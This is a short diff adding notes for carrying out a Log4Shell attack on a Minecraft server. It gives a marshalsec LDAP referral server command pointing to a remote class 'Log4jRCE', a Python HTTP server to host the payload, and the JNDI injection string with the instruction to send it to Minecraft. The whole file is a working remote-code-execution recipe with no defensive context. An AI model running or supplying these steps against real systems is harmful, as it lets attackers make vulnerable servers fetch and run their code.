@@ -1,0 +1,14 @@
+java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://130.215.217.133:8000/#Log4jRCE"
+
+
+This starts ldap in marshalsec
+
+
+python3 -m http.server
+
+This starts http to listen
+
+
+${jndi:ldap://MYCOMPIP:1389/EXPLOITCLASS}
+
+send this to minecraft
